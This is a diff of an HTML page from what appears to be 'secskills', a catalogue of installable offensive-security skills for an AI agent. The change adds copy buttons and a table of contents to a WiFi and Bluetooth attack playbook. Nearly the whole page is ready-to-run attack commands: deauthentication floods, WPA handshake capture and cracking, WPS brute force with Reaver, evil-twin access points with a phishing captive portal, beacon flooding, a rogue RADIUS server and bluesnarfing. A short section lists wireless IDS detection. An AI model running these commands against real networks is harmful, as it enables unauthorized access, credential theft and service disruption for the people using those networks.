@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Attack WiFi networks using WPA/WPA2 cracking, WPS exploitation, Evil Twin attacks, deauthentication, and wireless reconnaissance. Use when pentesting wireless networks or performing WiFi security assessments.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><h2>When to Use</h2>
+<div class="wrap slayout"><article><h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>WiFi penetration testing</li>
 <li>Wireless network security assessment</li>
@@ -47,7 +59,7 @@
 <li>Evil Twin and rogue AP attacks</li>
 <li>Wireless reconnaissance</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Wired network attacks</strong> — use <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
 <li><strong>Cracking the captured handshake</strong> — use <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
@@ -59,9 +71,9 @@
 <li><strong>Post-access network exploitation</strong> — move to <a class="xref" href="performing-reconnaissance.html"><code>performing-reconnaissance</code></a></li>
 </ul>
 <p>once you are on the network</p>
-<h2>Setup and Tools</h2>
+<h2 id="setup-and-tools">Setup and Tools</h2>
 <p><strong>Enable Monitor Mode:</strong></p>
-<pre><code># Check wireless interface
+<div class="codeblk cx"><button class="copy" data-copy="# Check wireless interface
 iwconfig
 iw dev
 
@@ -75,7 +87,21 @@ iw wlan0 set monitor none
 ip link set wlan0 up
 
 # Disable interfering processes
-airmon-ng check kill</code></pre>
+airmon-ng check kill">copy</button><pre><code># Check wireless interface
+iwconfig
+iw dev
+
+# Enable monitor mode
+airmon-ng start wlan0
+# Creates wlan0mon
+
+# Or manually
+ip link set wlan0 down
+iw wlan0 set monitor none
+ip link set wlan0 up
+
+# Disable interfering processes
+airmon-ng check kill</code></pre></div>
 <p><strong>Essential Tools:</strong></p>
 <ul>
 <li>aircrack-ng suite</li>
@@ -86,9 +112,9 @@ airmon-ng check kill</code></pre>
 <li>hcxtools/hcxdumptool</li>
 <li>Fluxion (Evil Twin)</li>
 </ul>
-<h2>WiFi Reconnaissance</h2>
+<h2 id="wifi-reconnaissance">WiFi Reconnaissance</h2>
 <p><strong>Network Discovery:</strong></p>
-<pre><code># Scan for networks
+<div class="codeblk cx"><button class="copy" data-copy="# Scan for networks
 airodump-ng wlan0mon
 
 # Scan specific channel
@@ -98,9 +124,19 @@ airodump-ng -c 6 wlan0mon
 airodump-ng -w capture wlan0mon
 
 # Filter by BSSID
-airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon</code></pre>
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon">copy</button><pre><code># Scan for networks
+airodump-ng wlan0mon
+
+# Scan specific channel
+airodump-ng -c 6 wlan0mon
+
+# Scan and save to file
+airodump-ng -w capture wlan0mon
+
+# Filter by BSSID
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon</code></pre></div>
 <p><strong>Kismet:</strong></p>
-<pre><code># Start Kismet
+<div class="codeblk cx"><button class="copy" data-copy="# Start Kismet
 kismet
 
 # Command line
@@ -108,10 +144,18 @@ kismet_server
 kismet_client
 
 # View in web UI
-http://localhost:2501</code></pre>
-<h2>WPA/WPA2 Attacks</h2>
+http://localhost:2501">copy</button><pre><code># Start Kismet
+kismet
+
+# Command line
+kismet_server
+kismet_client
+
+# View in web UI
+http://localhost:2501</code></pre></div>
+<h2 id="wpa-wpa2-attacks">WPA/WPA2 Attacks</h2>
 <h3>Capture Handshake</h3>
-<pre><code># Method 1: Wait for client connection
+<div class="codeblk cx"><button class="copy" data-copy="# Method 1: Wait for client connection
 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 
 # Method 2: Deauth clients to force reconnect
@@ -123,16 +167,32 @@ aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon
 
 # Verify handshake captured
 aircrack-ng capture-01.cap
-# Look for "1 handshake"</code></pre>
+# Look for &quot;1 handshake&quot;">copy</button><pre><code># Method 1: Wait for client connection
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Method 2: Deauth clients to force reconnect
+# In another terminal
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Or target specific client
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon
+
+# Verify handshake captured
+aircrack-ng capture-01.cap
+# Look for "1 handshake"</code></pre></div>
 <h3>Crack Handshake</h3>
 <p><strong>Aircrack-ng:</strong></p>
-<pre><code># Crack with wordlist
+<div class="codeblk cx"><button class="copy" data-copy="# Crack with wordlist
 aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
 
 # With specific ESSID
-aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap</code></pre>
+aircrack-ng -w wordlist.txt -e &quot;NetworkName&quot; capture-01.cap">copy</button><pre><code># Crack with wordlist
+aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+# With specific ESSID
+aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap</code></pre></div>
 <p><strong>Hashcat:</strong></p>
-<pre><code># Convert to hashcat format
+<div class="codeblk cx"><button class="copy" data-copy="# Convert to hashcat format
 hcxpcapngtool -o hash.hc22000 capture-01.cap
 
 # Crack WPA/WPA2 (mode 22000)
@@ -142,16 +202,30 @@ hashcat -m 22000 hash.hc22000 wordlist.txt
 hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
 
 # Mask attack
-hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d</code></pre>
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d">copy</button><pre><code># Convert to hashcat format
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+
+# Crack WPA/WPA2 (mode 22000)
+hashcat -m 22000 hash.hc22000 wordlist.txt
+
+# With rules
+hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
+
+# Mask attack
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d</code></pre></div>
 <p><strong>John the Ripper:</strong></p>
-<pre><code># Convert cap to john format
+<div class="codeblk cx"><button class="copy" data-copy="# Convert cap to john format
 hccap2john capture-01.cap &gt; hash.john
 
 # Crack
-john --wordlist=wordlist.txt hash.john</code></pre>
-<h2>WPS Attacks</h2>
+john --wordlist=wordlist.txt hash.john">copy</button><pre><code># Convert cap to john format
+hccap2john capture-01.cap &gt; hash.john
+
+# Crack
+john --wordlist=wordlist.txt hash.john</code></pre></div>
+<h2 id="wps-attacks">WPS Attacks</h2>
 <h3>WPS Brute Force (Reaver)</h3>
-<pre><code># Check WPS status
+<div class="codeblk cx"><button class="copy" data-copy="# Check WPS status
 wash -i wlan0mon
 
 # Reaver attack
@@ -161,16 +235,30 @@ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5
 
 # Pixie Dust attack (if vulnerable)
-reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K</code></pre>
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K">copy</button><pre><code># Check WPS status
+wash -i wlan0mon
+
+# Reaver attack
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+
+# With delay (less aggressive)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5
+
+# Pixie Dust attack (if vulnerable)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K</code></pre></div>
 <h3>Bully (Alternative)</h3>
-<pre><code># Standard attack
+<div class="codeblk cx"><button class="copy" data-copy="# Standard attack
 bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
 
 # Pixie Dust
-bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon -d</code></pre>
-<h2>Evil Twin Attacks</h2>
+bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon -d">copy</button><pre><code># Standard attack
+bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+
+# Pixie Dust
+bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon -d</code></pre></div>
+<h2 id="evil-twin-attacks">Evil Twin Attacks</h2>
 <h3>Fluxion</h3>
-<pre><code># Start Fluxion
+<div class="codeblk cx"><button class="copy" data-copy="# Start Fluxion
 ./fluxion.sh
 
 # Follow prompts to:
@@ -178,9 +266,17 @@ bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon -d</code></pre>
 # 2. Capture handshake
 # 3. Create fake AP
 # 4. Launch captive portal
-# 5. Capture credentials</code></pre>
+# 5. Capture credentials">copy</button><pre><code># Start Fluxion
+./fluxion.sh
+
+# Follow prompts to:
+# 1. Select target network
+# 2. Capture handshake
+# 3. Create fake AP
+# 4. Launch captive portal
+# 5. Capture credentials</code></pre></div>
 <h3>Manual Evil Twin</h3>
-<pre><code># Create rogue AP
+<div class="codeblk cx"><button class="copy" data-copy="# Create rogue AP
 hostapd rogue_ap.conf
 
 # Sample hostapd.conf:
@@ -201,36 +297,73 @@ dhcp-option=6,10.0.0.1
 server=8.8.8.8
 
 # Captive portal (fake login page)
-# Setup web server with phishing page</code></pre>
-<h2>WPA3 Attacks</h2>
+# Setup web server with phishing page">copy</button><pre><code># Create rogue AP
+hostapd rogue_ap.conf
+
+# Sample hostapd.conf:
+interface=wlan0mon
+driver=nl80211
+ssid=FreeWiFi
+channel=6
+hw_mode=g
+
+# DHCP server
+dnsmasq -C dnsmasq.conf
+
+# Sample dnsmasq.conf:
+interface=wlan0mon
+dhcp-range=10.0.0.10,10.0.0.100,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+
+# Captive portal (fake login page)
+# Setup web server with phishing page</code></pre></div>
+<h2 id="wpa3-attacks">WPA3 Attacks</h2>
 <h3>Dragonblood</h3>
-<pre><code># Dragonblood toolkit
+<div class="codeblk cx"><button class="copy" data-copy="# Dragonblood toolkit
 # Tests WPA3 vulnerabilities (CVE-2019-13377, CVE-2019-13456)
 
 # Dictionary attack (downgrade to WPA2)
-# If SAE (WPA3) and WPA2 transition mode enabled</code></pre>
+# If SAE (WPA3) and WPA2 transition mode enabled">copy</button><pre><code># Dragonblood toolkit
+# Tests WPA3 vulnerabilities (CVE-2019-13377, CVE-2019-13456)
+
+# Dictionary attack (downgrade to WPA2)
+# If SAE (WPA3) and WPA2 transition mode enabled</code></pre></div>
 <h3>Brute Force SAE</h3>
-<pre><code># hashcat WPA3 (experimental)
-hashcat -m 22000 hash.hc22000 wordlist.txt</code></pre>
-<h2>Denial of Service</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# hashcat WPA3 (experimental)
+hashcat -m 22000 hash.hc22000 wordlist.txt">copy</button><pre><code># hashcat WPA3 (experimental)
+hashcat -m 22000 hash.hc22000 wordlist.txt</code></pre></div>
+<h2 id="denial-of-service">Denial of Service</h2>
 <h3>Deauthentication Attack</h3>
-<pre><code># Deauth all clients
+<div class="codeblk cx"><button class="copy" data-copy="# Deauth all clients
 aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
 
 # Deauth specific client
 aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon
 
 # MDK3 (more aggressive)
-mdk3 wlan0mon d -c 6</code></pre>
+mdk3 wlan0mon d -c 6">copy</button><pre><code># Deauth all clients
+aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Deauth specific client
+aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon
+
+# MDK3 (more aggressive)
+mdk3 wlan0mon d -c 6</code></pre></div>
 <h3>Beacon Flooding</h3>
-<pre><code># MDK3 beacon flood
+<div class="codeblk cx"><button class="copy" data-copy="# MDK3 beacon flood
 mdk3 wlan0mon b -f fake_aps.txt
 
 # Create many fake APs
-mdk3 wlan0mon b -n "FakeAP" -m -s 1000</code></pre>
-<h2>Automated Tools</h2>
+mdk3 wlan0mon b -n &quot;FakeAP&quot; -m -s 1000">copy</button><pre><code># MDK3 beacon flood
+mdk3 wlan0mon b -f fake_aps.txt
+
+# Create many fake APs
+mdk3 wlan0mon b -n "FakeAP" -m -s 1000</code></pre></div>
+<h2 id="automated-tools">Automated Tools</h2>
 <h3>Wifite</h3>
-<pre><code># Automated WiFi cracking
+<div class="codeblk cx"><button class="copy" data-copy="# Automated WiFi cracking
 wifite
 
 # Target WPA only
@@ -243,9 +376,22 @@ wifite --wps
 wifite -b AA:BB:CC:DD:EE:FF
 
 # With custom wordlist
-wifite --dict wordlist.txt</code></pre>
+wifite --dict wordlist.txt">copy</button><pre><code># Automated WiFi cracking
+wifite
+
+# Target WPA only
+wifite --wpa
+
+# Target WPS only
+wifite --wps
+
+# Specific BSSID
+wifite -b AA:BB:CC:DD:EE:FF
+
+# With custom wordlist
+wifite --dict wordlist.txt</code></pre></div>
 <h3>WiFi-Pumpkin (Rogue AP Framework)</h3>
-<pre><code># Launch WiFi-Pumpkin
+<div class="codeblk cx"><button class="copy" data-copy="# Launch WiFi-Pumpkin
 wifi-pumpkin
 
 # Features:
@@ -253,10 +399,29 @@ wifi-pumpkin
 # - MITM attacks
 # - DNS spoofing
 # - Captive portal
-# - Traffic sniffing</code></pre>
-<h2>Enterprise WiFi (WPA-Enterprise)</h2>
+# - Traffic sniffing">copy</button><pre><code># Launch WiFi-Pumpkin
+wifi-pumpkin
+
+# Features:
+# - Rogue AP creation
+# - MITM attacks
+# - DNS spoofing
+# - Captive portal
+# - Traffic sniffing</code></pre></div>
+<h2 id="enterprise-wifi-wpa-enterprise">Enterprise WiFi (WPA-Enterprise)</h2>
 <h3>EAP-TLS/PEAP Attacks</h3>
-<pre><code># Capture EAP handshake
+<div class="codeblk cx"><button class="copy" data-copy="# Capture EAP handshake
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w eap_capture wlan0mon
+
+# Extract RADIUS traffic
+tshark -r eap_capture-01.cap -Y &quot;eap&quot;
+
+# Rogue RADIUS server
+# hostapd-wpe (Wireless Pwnage Edition)
+hostapd-wpe wpe.conf
+
+# Crack captured hashes
+asleap -r capture.dump -w wordlist.txt">copy</button><pre><code># Capture EAP handshake
 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w eap_capture wlan0mon
 
 # Extract RADIUS traffic
@@ -267,18 +432,25 @@ tshark -r eap_capture-01.cap -Y "eap"
 hostapd-wpe wpe.conf
 
 # Crack captured hashes
-asleap -r capture.dump -w wordlist.txt</code></pre>
-<h2>Packet Injection Testing</h2>
-<pre><code># Test injection capability
+asleap -r capture.dump -w wordlist.txt</code></pre></div>
+<h2 id="packet-injection-testing">Packet Injection Testing</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Test injection capability
 aireplay-ng --test wlan0mon
 
 # Fake authentication
 aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon
 
 # ARP replay attack
-aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon</code></pre>
-<h2>Hidden SSID Discovery</h2>
-<pre><code># Passive monitoring
+aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon">copy</button><pre><code># Test injection capability
+aireplay-ng --test wlan0mon
+
+# Fake authentication
+aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon
+
+# ARP replay attack
+aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon</code></pre></div>
+<h2 id="hidden-ssid-discovery">Hidden SSID Discovery</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Passive monitoring
 airodump-ng wlan0mon
 # Wait for client probe requests
 
@@ -286,27 +458,49 @@ airodump-ng wlan0mon
 mdk3 wlan0mon p -t AA:BB:CC:DD:EE:FF
 
 # Deauth and capture beacon
-aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
-<h2>Bluetooth Attacks</h2>
+aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon">copy</button><pre><code># Passive monitoring
+airodump-ng wlan0mon
+# Wait for client probe requests
+
+# Active probing
+mdk3 wlan0mon p -t AA:BB:CC:DD:EE:FF
+
+# Deauth and capture beacon
+aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon</code></pre></div>
+<h2 id="bluetooth-attacks">Bluetooth Attacks</h2>
 <h3>Discovery</h3>
-<pre><code># Scan for devices
+<div class="codeblk cx"><button class="copy" data-copy="# Scan for devices
 hcitool scan
 
 # Detailed info
 hcitool info AA:BB:CC:DD:EE:FF
 
 # Service discovery
-sdptool browse AA:BB:CC:DD:EE:FF</code></pre>
+sdptool browse AA:BB:CC:DD:EE:FF">copy</button><pre><code># Scan for devices
+hcitool scan
+
+# Detailed info
+hcitool info AA:BB:CC:DD:EE:FF
+
+# Service discovery
+sdptool browse AA:BB:CC:DD:EE:FF</code></pre></div>
 <h3>BluetoothHunting</h3>
-<pre><code># Bluesnarfing (file access)
+<div class="codeblk cx"><button class="copy" data-copy="# Bluesnarfing (file access)
+bluesnarfer -b AA:BB:CC:DD:EE:FF
+
+# Bluejacking (send messages)
+echo &quot;Message&quot; | bluejack AA:BB:CC:DD:EE:FF
+
+# PIN brute force
+crackle -i hci0 -o pin.txt">copy</button><pre><code># Bluesnarfing (file access)
 bluesnarfer -b AA:BB:CC:DD:EE:FF
 
 # Bluejacking (send messages)
 echo "Message" | bluejack AA:BB:CC:DD:EE:FF
 
 # PIN brute force
-crackle -i hci0 -o pin.txt</code></pre>
-<h2>Quick WiFi Pentest Workflow</h2>
+crackle -i hci0 -o pin.txt</code></pre></div>
+<h2 id="quick-wifi-pentest-workflow">Quick WiFi Pentest Workflow</h2>
 <ol>
 <li><strong>Monitor Mode</strong> - Enable monitor mode on wireless adapter</li>
 <li><strong>Reconnaissance</strong> - Scan for networks (airodump-ng/kismet)</li>
@@ -315,7 +509,7 @@ crackle -i hci0 -o pin.txt</code></pre>
 <li><strong>Cracking</strong> - Crack with hashcat/aircrack-ng</li>
 <li><strong>Post-Exploitation</strong> - Connect and perform MITM/sniffing</li>
 </ol>
-<h2>Common Wins</h2>
+<h2 id="common-wins">Common Wins</h2>
 <ul>
 <li><strong>WPS-enabled routers</strong> - Often crackable in minutes with Reaver</li>
 <li><strong>Weak passwords</strong> - Common WiFi passwords in rockyou.txt</li>
@@ -323,7 +517,7 @@ crackle -i hci0 -o pin.txt</code></pre>
 <li><strong>Open guest networks</strong> - No authentication required</li>
 <li><strong>Misconfigured Enterprise</strong> - Weak RADIUS authentication</li>
 </ul>
-<h2>Defense Detection</h2>
+<h2 id="defense-detection">Defense Detection</h2>
 <ul>
 <li>Wireless IDS (WIDS) may detect:</li>
 <ul>
@@ -334,7 +528,7 @@ crackle -i hci0 -o pin.txt</code></pre>
 </ul>
 <li>Be aware of monitoring and physical security</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Credential Access</strong> (TA0006)</p>
 <ul>
@@ -342,11 +536,14 @@ crackle -i hci0 -o pin.txt</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1557/">T1557</a> Adversary-in-the-Middle <em>(also Collection)</em> — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li>https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi</li>
 <li>https://www.aircrack-ng.org/</li>
 <li>https://github.com/wifiphisher/wifiphisher</li>
 <li>https://www.kali.org/tools/</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#setup-and-tools">Setup and Tools</a><a href="#wifi-reconnaissance">WiFi Reconnaissance</a><a href="#wpa-wpa2-attacks">WPA/WPA2 Attacks</a><a href="#wps-attacks">WPS Attacks</a><a href="#evil-twin-attacks">Evil Twin Attacks</a><a href="#wpa3-attacks">WPA3 Attacks</a><a href="#denial-of-service">Denial of Service</a><a href="#automated-tools">Automated Tools</a><a href="#enterprise-wifi-wpa-enterprise">Enterprise WiFi (WPA-Enterprise)</a><a href="#packet-injection-testing">Packet Injection Testing</a><a href="#hidden-ssid-discovery">Hidden SSID Discovery</a><a href="#bluetooth-attacks">Bluetooth Attacks</a><a href="#quick-wifi-pentest-workflow">Quick WiFi Pentest Workflow</a><a href="#common-wins">Common Wins</a><a href="#defense-detection">Defense Detection</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
